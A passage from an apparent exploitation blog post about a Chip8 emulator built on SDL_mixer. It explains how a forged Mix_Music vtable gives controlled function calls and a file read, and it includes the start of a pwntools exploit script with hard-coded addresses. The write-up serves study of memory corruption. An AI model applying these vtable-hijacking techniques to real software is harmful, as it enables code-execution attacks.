+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bool</span> <span class="nf">Mix_PlayMusic</span><span class="p">(</span><span class="n">Mix_Music</span> <span class="o">*</span><span class="n">music</span><span class="p">,</span> <span class="kt">int</span> <span class="n">loops</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="n">Mix_FadeInMusicPos</span><span class="p">(</span><span class="n">music</span><span class="p">,</span> <span class="n">loops</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Here is <code class="language-plaintext highlighter-rouge">Mix_FadeInMusicPos</code></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bool</span> <span class="nf">Mix_FadeInMusicPos</span><span class="p">(</span><span class="n">Mix_Music</span> <span class="o">*</span><span class="n">music</span><span class="p">,</span> <span class="kt">int</span> <span class="n">loops</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ms</span><span class="p">,</span> <span class="kt">double</span> <span class="n">position</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">bool</span> <span class="n">retval</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">ms_per_step</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">SDL_SetError</span><span class="p">(</span><span class="s">"Audio device hasn't been opened"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="cm">/* Don't play null pointers :-) */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">music</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">SDL_SetError</span><span class="p">(</span><span class="s">"music parameter was NULL"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="cm">/* Setup the data */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ms</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">music</span><span class="o">-&gt;</span><span class="n">fading</span> <span class="o">=</span> <span class="n">MIX_FADING_IN</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">music</span><span class="o">-&gt;</span><span class="n">fading</span> <span class="o">=</span> <span class="n">MIX_NO_FADING</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">music</span><span class="o">-&gt;</span><span class="n">fade_step</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">music</span><span class="o">-&gt;</span><span class="n">fade_steps</span> <span class="o">=</span> <span class="p">(</span><span class="n">ms</span> <span class="o">+</span> <span class="n">ms_per_step</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">/</span> <span class="n">ms_per_step</span><span class="p">;</span>
+
+    <span class="cm">/* Play the puppy */</span>
+    <span class="n">Mix_LockAudio</span><span class="p">();</span>
+    <span class="cm">/* If the current music is fading out, wait for the fade to complete */</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">music_playing</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">fading</span> <span class="o">==</span> <span class="n">MIX_FADING_OUT</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">Mix_UnlockAudio</span><span class="p">();</span>
+        <span class="n">SDL_Delay</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+        <span class="n">Mix_LockAudio</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">loops</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="cm">/* Loop is the number of times to play the audio */</span>
+        <span class="n">loops</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">retval</span> <span class="o">=</span> <span class="p">(</span><span class="n">music_internal_play</span><span class="p">(</span><span class="n">music</span><span class="p">,</span> <span class="n">loops</span><span class="p">,</span> <span class="n">position</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="cm">/* Set music as active */</span>
+    <span class="n">music_active</span> <span class="o">=</span> <span class="n">retval</span><span class="p">;</span>
+    <span class="n">Mix_UnlockAudio</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The interesting bits seems to be in <code class="language-plaintext highlighter-rouge">music_internal_play</code></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">music_internal_play</span><span class="p">(</span><span class="n">Mix_Music</span> <span class="o">*</span><span class="n">music</span><span class="p">,</span> <span class="kt">int</span> <span class="n">play_count</span><span class="p">,</span> <span class="kt">double</span> <span class="n">position</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">retval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="cm">/* Note the music we're playing */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">music_playing</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">music_internal_halt</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="n">music_playing</span> <span class="o">=</span> <span class="n">music</span><span class="p">;</span>
+    <span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">playing</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+
+    <span class="cm">/* Set the initial volume */</span>
+    <span class="n">music_internal_initialize_volume</span><span class="p">();</span>
+
+    <span class="cm">/* Set up for playback */</span>
+    <span class="n">retval</span> <span class="o">=</span> <span class="n">music</span><span class="o">-&gt;</span><span class="n">interface</span><span class="o">-&gt;</span><span class="n">Play</span><span class="p">(</span><span class="n">music</span><span class="o">-&gt;</span><span class="n">context</span><span class="p">,</span> <span class="n">play_count</span><span class="p">);</span>
+
+    <span class="cm">/* Set the playback position, note any errors if an offset is used */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">position</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">music_internal_position</span><span class="p">(</span><span class="n">position</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">SDL_SetError</span><span class="p">(</span><span class="s">"Position not implemented for music type"</span><span class="p">);</span>
+                <span class="n">retval</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="n">music_internal_position</span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="cm">/* If the setup failed, we're not playing any music anymore */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">music</span><span class="o">-&gt;</span><span class="n">playing</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+        <span class="n">music_playing</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This function first checks if music is playing already by checking the global variable <code class="language-plaintext highlighter-rouge">music_playing</code> is not <code class="language-plaintext highlighter-rouge">NULL</code>: in that 
+case there is music playing stored in the global pointer <code class="language-plaintext highlighter-rouge">music_playing</code> and it is stopped via <code class="language-plaintext highlighter-rouge">music_internal_halt</code></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">music_internal_halt</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">interface</span><span class="o">-&gt;</span><span class="n">Stop</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">interface</span><span class="o">-&gt;</span><span class="n">Stop</span><span class="p">(</span><span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">context</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">playing</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">fading</span> <span class="o">=</span> <span class="n">MIX_NO_FADING</span><span class="p">;</span>
+    <span class="n">music_playing</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This does call a function in the vtable (the <code class="language-plaintext highlighter-rouge">Stop</code> function): to trigger this we need to trigger <code class="language-plaintext highlighter-rouge">Mix_PlayMusic</code> twice
+before the first sample has finished playing.</p>
+
+<p>Continuing the global <code class="language-plaintext highlighter-rouge">music_playing</code> is set and there is a call to <code class="language-plaintext highlighter-rouge">music_internal_initialize_volume</code></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">music_internal_initialize_volume</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">fading</span> <span class="o">==</span> <span class="n">MIX_FADING_IN</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">music_internal_volume</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">music_internal_volume</span><span class="p">(</span><span class="n">music_volume</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>which calls <code class="language-plaintext highlighter-rouge">music_internal_volume</code></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">music_internal_volume</span><span class="p">(</span><span class="kt">int</span> <span class="n">volume</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">interface</span><span class="o">-&gt;</span><span class="n">SetVolume</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">interface</span><span class="o">-&gt;</span><span class="n">SetVolume</span><span class="p">(</span><span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">context</span><span class="p">,</span> <span class="n">volume</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>which calls the <code class="language-plaintext highlighter-rouge">SetVolume</code> vtable function with the <code class="language-plaintext highlighter-rouge">music_playing-&gt;context</code> as first parameter. Clearly we control both the 
+vtable and the <code class="language-plaintext highlighter-rouge">context</code> variable (which will be passed in the <code class="language-plaintext highlighter-rouge">rdi</code> register).</p>
+
+<p>Then there is a another call to the vtable function <code class="language-plaintext highlighter-rouge">Play</code> again passing <code class="language-plaintext highlighter-rouge">context</code> as first argument: this is the second 
+arbitrary call.</p>
+
+<p>Finally, there is a call to <code class="language-plaintext highlighter-rouge">music_internal_position</code></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">music_internal_position</span><span class="p">(</span><span class="kt">double</span> <span class="n">position</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">interface</span><span class="o">-&gt;</span><span class="n">Seek</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">interface</span><span class="o">-&gt;</span><span class="n">Seek</span><span class="p">(</span><span class="n">music_playing</span><span class="o">-&gt;</span><span class="n">context</span><span class="p">,</span> <span class="n">position</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>which will call the vtable function <code class="language-plaintext highlighter-rouge">Seek</code>.</p>
+
+<p>At this point I was a bit stuck until I realized that I was placing the fake music object at the wrong address. In order for
+the Chip8 code to interact with these primitives I need to put the fake music object on the Chip8’s memory!</p>
+
+<p>I decided to only use the call to <code class="language-plaintext highlighter-rouge">Play</code> as we can trigger it multiple times anyhow. All the other <code class="language-plaintext highlighter-rouge">interface</code> pointer are
+<code class="language-plaintext highlighter-rouge">NULL</code>-checked so I set them to <code class="language-plaintext highlighter-rouge">NULL</code>to avoid the calls.</p>
+
+<p>The address we must now write to the global <code class="language-plaintext highlighter-rouge">sound</code> variable is <code class="language-plaintext highlighter-rouge">0x406020</code>. Unfortunately, this seems impossible to me as I would
+have to write the value <code class="language-plaintext highlighter-rouge">0x6020</code> which would correspond to making execution start at a PC of <code class="language-plaintext highlighter-rouge">0x1e</code> and I do not control what 
+instructions are there at the beggining of the execution.</p>
+
+<p>What I can however do is place the <code class="language-plaintext highlighter-rouge">interface</code> in the Chip8’s memory while having the fake music object places at the already said
+address: <code class="language-plaintext highlighter-rouge">0x406a5e</code>.</p>
+
+<h1 id="controlling-calls-from-the-chip8-assembly">Controlling <code class="language-plaintext highlighter-rouge">call</code>s from the Chip8 assembly</h1>
+
+<p>Now I am in a position in which I can control <code class="language-plaintext highlighter-rouge">call</code> instructions (the x64 <code class="language-plaintext highlighter-rouge">call</code>, not the chip8’s) from the chip8’s assembly,
+by simplying writing where I want to call at a specific memory location and then triggering the sound. Before at address <code class="language-plaintext highlighter-rouge">0x222</code>
+I was simpling triggering the sound once, now let me do something more complicated. We can first write where to call using the Chip8’s assembly and then call it by triggering the sound, in this way I have multiple controlled calls. And while I can’t
+control <code class="language-plaintext highlighter-rouge">rdi</code> at every call I made it point to the beggining of the Chip8’s memory so that I dynamically control what it
+points to. For example calling <code class="language-plaintext highlighter-rouge">printf@plt</code> I can achieve the following</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ ./Chip8 exploit
+hello world
+this is written by the chip8's code
+zsh: segmentation fault  ./Chip8 exploit
+
+</code></pre></div></div>
+
+<h1 id="arbitrary-file-read-using-load_rom">Arbitrary file read using <code class="language-plaintext highlighter-rouge">load_ROM</code></h1>
+
+<p>There is one interesting function to call and it is <code class="language-plaintext highlighter-rouge">load_ROM</code>! This just read any file into the Chip8’s memory starting at
+address <code class="language-plaintext highlighter-rouge">0x200</code>. I thought I can just read <code class="language-plaintext highlighter-rouge">/proc/self/maps</code> and kill ASLR. Unfortunately, I’d like to find the <code class="language-plaintext highlighter-rouge">libc</code> base
+(to then call <code class="language-plaintext highlighter-rouge">system</code>) and the file is so big that the <code class="language-plaintext highlighter-rouge">libc</code> address wouldn’t end up in the readable memory. In general it 
+turns out I can’t really read files under <code class="language-plaintext highlighter-rouge">/proc</code> as the <code class="language-plaintext highlighter-rouge">size</code> local variable in <code class="language-plaintext highlighter-rouge">load_ROM</code> ends up being zero when reading them.</p>
+
+<p>Overall this is an interesting primitive, but not being able to read <code class="language-plaintext highlighter-rouge">/proc</code> files leaves me confused on how to use this to defeat
+ASLR (which is what keeping me from calling <code class="language-plaintext highlighter-rouge">system</code> and getting arbitrary code execution).</p>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>Unfortunately I was not able to turn this into arbitrary code execution: my limited knowledge and the fact that the imported 
+functions by the binary are so few make the exploitation not straightforward. However I would argue there are loads of 
+possibilities to be explored with the primitives I built.</p>
+
+<p>Also this was all done disabling PIE, with PIE enabled the explotation seems more complicated. It would be possible to use a
+partial overwrite to overwrite the <code class="language-plaintext highlighter-rouge">sound</code> pointer, however this lives on the heap and we have no control of the heap, so even
+then the partial overwrite would be useless.</p>
+
+<p>Anyhow, here is the full hello world exploit code. Please if you are able to turn this into arbitrary code execution let me know
+by sending a DM on <a href="https://x.com/lucabtz_">X</a>, thanks for reading!</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pwn</span>
+
+<span class="c1"># pwndbg&gt; ptype /o struct Chip8
+#/* offset      |    size */  type = struct Chip8 {
+#/*      0      |    4096 */    uint8_t memory[4096];
+#/*   4096      |    2048 */    uint8_t display[2048];
+#/*   6144      |       2 */    uint16_t pc;
+#/*   6146      |       2 */    uint16_t index;
+#/*   6148      |      32 */    uint16_t stack[16];
+#/*   6180      |       1 */    uint8_t stack_pointer;
+#/*   6181      |       1 */    uint8_t delay;
+#/*   6182      |       1 */    uint8_t sound;
+#/*   6183      |      16 */    uint8_t registers[16];
+#/* XXX  1-byte hole      */
+#/*   6200      |       2 */    uint16_t op_code;
+#/*   6202      |       1 */    uint8_t draw_flag;
+#/*   6203      |       1 */    uint8_t draw_wait;
+#/*   6204      |      16 */    uint8_t input[16];
+#
+#                               /* total size (bytes): 6220 */
+#                             }
+</span>
+
+<span class="n">ROM_START_OFFSET</span>   <span class="o">=</span> <span class="mh">0x200</span>
+
+<span class="c1"># chip struct offsets from rom start
+</span><span class="n">PC_OFFSET</span>          <span class="o">=</span> <span class="mi">6144</span> <span class="o">-</span> <span class="mh">0x200</span>
+<span class="n">SP_OFFSET</span>          <span class="o">=</span> <span class="mi">6180</span> <span class="o">-</span> <span class="mh">0x200</span>
+<span class="n">CHIP_STRUCT_SIZE</span>   <span class="o">=</span> <span class="mi">6220</span>
+
+<span class="n">MUSIC_ADDR</span>         <span class="o">=</span> <span class="mh">0x406990</span>
+<span class="n">CHIP_ADDR</span>          <span class="o">=</span> <span class="mh">0x405120</span>
+<span class="n">BUFFER_START_ADDR</span>  <span class="o">=</span> <span class="n">CHIP_ADDR</span> <span class="o">+</span> <span class="n">ROM_START_OFFSET</span>
+<span class="n">MEMORY_END_ADDR</span>    <span class="o">=</span> <span class="n">CHIP_ADDR</span> <span class="o">+</span> <span class="mh">0x1000</span>
+<span class="n">STACK_ADDR</span>         <span class="o">=</span> <span class="n">CHIP_ADDR</span> <span class="o">+</span> <span class="mi">6148</span>
+
+<span class="c1"># offset of music from chip.stack
+</span><span class="n">MUSIC_OFFSET</span>       <span class="o">=</span> <span class="n">MUSIC_ADDR</span> <span class="o">-</span> <span class="n">STACK_ADDR</span> 
+<span class="n">SP_VALUE</span>           <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">MUSIC_OFFSET</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span>
+
+<span class="n">PRINTF_PLT</span>         <span class="o">=</span> <span class="mh">0x401080</span>
+
+    <span class="c1">#struct Mix_Music {
+</span>    <span class="c1">#    Mix_MusicInterface *interface;
+</span>    <span class="c1">#    void *context;
+</span>    <span class="c1">#
+</span>    <span class="c1">#    bool playing;
+</span>    <span class="c1">#    Mix_Fading fading;
+</span>    <span class="c1">#    int fade_step;
+</span>    <span class="c1">#    int fade_steps;
+</span>    <span class="c1">#
+</span>    <span class="c1">#    char filename[1024];
+</span>    <span class="c1">#};
+</span>
+    <span class="c1">#sizeof(struct Mix_Music) = 1056
+</span>    <span class="c1">#sizeof(struct Mix_Music) - filename = 32
+</span>    <span class="c1">#sizeof(Mix_MusicInterface) = 224
+</span>    <span class="c1">#offsetof(Mix_MusicInterface, SetVolume) = 56
+</span>    <span class="c1">#offsetof(Mix_MusicInterface, Play) = 72
+</span>    <span class="c1">#offsetof(Mix_MusicInterface, Seek) = 104
+</span>    <span class="c1">#offsetof(Mix_MusicInterface, Stop) = 192
+</span>
+<span class="n">FAKE_MUSIC_ADDR</span>    <span class="o">=</span> <span class="mh">0x406a5e</span>
+<span class="n">INTERFACE_ADDR</span>     <span class="o">=</span> <span class="n">MEMORY_END_ADDR</span> <span class="o">-</span> <span class="mi">224</span>
+<span class="n">PLAY_ADDR</span>          <span class="o">=</span> <span class="n">INTERFACE_ADDR</span> <span class="o">+</span> <span class="mi">72</span>
+<span class="n">PLAY_CHIP_ADDR</span>     <span class="o">=</span> <span class="n">PLAY_ADDR</span> <span class="o">-</span> <span class="n">CHIP_ADDR</span>
+
+
+<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="sa">b</span><span class="s">"A"</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">n</span> <span class="o">*</span> <span class="n">padding</span><span class="p">)[:</span><span class="n">n</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">filename</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="k">class</span> <span class="nc">Asm</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">instructions</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">pc</span> <span class="o">=</span> <span class="mh">0x200</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+
+    <span class="k">def</span> <span class="nf">_validate_addr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xfff</span> <span class="o">==</span> <span class="n">addr</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+            <span class="k">assert</span> <span class="bp">False</span>
+
+    <span class="k">def</span> <span class="nf">_validate_x</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="k">assert</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xf</span> <span class="o">==</span> <span class="n">x</span>
+
+    <span class="k">def</span> <span class="nf">_validate_nn</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">nn</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="k">assert</span> <span class="n">nn</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="o">==</span> <span class="n">nn</span>
+
+    <span class="k">def</span> <span class="nf">_increment_pc</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">pc</span> <span class="o">+=</span> <span class="mi">2</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">instructions</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">instructions</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">11</span>
+
+    <span class="k">def</span> <span class="nf">_pack_opcode</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">opcode</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">pwn</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span> <span class="n">word_size</span><span class="o">=</span><span class="mi">16</span><span class="p">,</span> <span class="n">endianness</span><span class="o">=</span><span class="s">"big"</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">jump</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">|</span> <span class="n">addr</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">call</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x2000</span> <span class="o">|</span> <span class="n">addr</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">set_index</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0xa000</span> <span class="o">|</span> <span class="n">addr</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">store_vx</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0xf055</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">load_vx_imm</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">imm</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_nn</span><span class="p">(</span><span class="n">imm</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x6000</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">imm</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">clear_screen</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x00e0</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">set_sound</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0xf018</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">nop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">jump</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">pc</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">seek_pc</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">seeked_pc</span><span class="p">):</span>
